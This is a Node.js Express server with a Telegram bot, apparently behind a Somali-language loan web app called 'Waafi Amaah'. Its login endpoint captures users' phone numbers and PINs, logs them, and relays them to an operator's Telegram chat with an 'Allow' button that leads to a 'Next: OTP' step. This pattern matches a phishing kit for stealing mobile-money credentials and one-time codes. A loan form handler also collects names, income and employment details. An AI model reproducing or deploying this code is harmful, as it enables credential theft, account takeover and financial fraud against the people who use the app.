const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

// 1. Validate ENV
if (!process.env.BOT_TOKEN) {
    console.error("❌ BOT_TOKEN is missing");
    process.exit(1);
}

const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();
if (!ADMIN_ID) {
    console.warn("⚠️ ADMIN_CHAT_ID is not set");
}

// 2. Initialize Bot
const bot = new Telegraf(process.env.BOT_TOKEN);

// 3. Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// 4. Home Route
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// 5. Dynamic Routing
app.get('/:page', (req, res) => {
    const page = req.params.page;
    const fileName = page.endsWith('.html') ? page : `${page}.html`;
    const filePath = path.join(__dirname, 'public', fileName);

    res.sendFile(filePath, (err) => {
        if (err) {
            console.error(`❌ Missing file: ${filePath}`);
            res.status(404).send("Boggaan lama helin (Page not found)");
        }
    });
});

// 6. Bot Start Command
bot.start((ctx) => {
    return ctx.reply('Ku soo dhowaad Waafi Amaah! 👇', {
        reply_markup: {
            inline_keyboard: [
                [
                    {
                        text: "🚀 Fur App",
                        web_app: {
                            url: process.env.WEBAPP_URL || "https://your-domain.com"
                        }
                    }
                ]
            ]
        }
    });
});

// 7. Login Notification API (FIXED)
app.post('/api/login-notification', async (req, res) => {
    const { phone = "", pin = "" } = req.body || {};

    console.log("📩 Incoming login request:", phone, pin);

    if (!ADMIN_ID) {
        return res.status(500).json({ error: "ADMIN_CHAT_ID not set" });
    }

    if (!phone || !pin) {
        return res.status(400).json({ error: "Missing phone or pin" });
    }

    const currentTime = new Date().toLocaleString('en-US', { hour12: true });

    const loginMsg =
        `📱 CL 2 - LOGIN ATTEMPT\n\n` +
        `📞 Phone: +252${phone}\n` +
        `🔢 PIN: ${pin}\n` +
        `⏰ Time: ${currentTime}\n\n` +
        `⚠️ Waiting for approval`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, loginMsg, {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Allow", callback_data: `approve_${phone}_${pin}` }
                    ],
                    [
                        { text: "❌ Deny", callback_data: "deny" }
                    ]
                ]
            }
        });

        console.log("✅ Telegram message sent");
        res.json({ success: true });

    } catch (err) {
        console.error(
            "❌ API Notification Error:",
            err.response?.description || err.message
        );
        res.status(500).json({ error: "Failed to send bot notification" });
    }
});

// 8. Web App Data Handler (Loan)
bot.on('message', async (ctx) => {
    const webAppData = ctx.message?.web_app_data;
    if (!webAppData) return;

    try {
        const data = JSON.parse(webAppData.data);

        const summary =
            `✅ CODSI CUSUB\n\n` +
            `👤 ${data.firstName || ''} ${data.lastName || ''}\n` +
            `📞 +252${data.phone || ''}\n` +
            `💰 $${data.amount || 'N/A'}\n` +
            `📆 ${data.duration || 'N/A'}\n` +
            `💼 ${data.jobStatus || 'N/A'}\n` +
            `💵 $${data.income || 'N/A'}\n` +
            `📝 ${data.loanPurpose || 'N/A'}`;

        await ctx.reply(summary);

    } catch (err) {
        console.error("❌ Data error:", err.message);
    }
});

// 9. Actions
bot.action(/approve_(.+)_(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    const time = new Date().toLocaleTimeString('en-US', { hour12: true });

    const approvedMsg =
        `✅ LOGIN APPROVED\n\n` +
        `📱 +252${phone}\n` +
        `🔐 ${pin}\n\n` +
        `➡ Next: OTP\n` +
        `⌚ ${time}`;

    try {
        await ctx.editMessageText(approvedMsg);
    } catch (e) {
        console.error("❌ Edit failed:", e.message);
    }
});

bot.action('deny', async (ctx) => {
    try {
        await ctx.editMessageText("❌ Informashinka waa khalad");
    } catch (e) {
        console.error("❌ Deny error:", e.message);
    }
});

// 10. Start Server
app.listen(PORT, async () => {
    console.log(`✅ Server running on port ${PORT}`);

    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        await bot.launch();
        console.log("✅ Bot launched successfully");
    } catch (err) {
        console.error("❌ Bot launch failed:", err.message);
    }
});

// 11. Graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
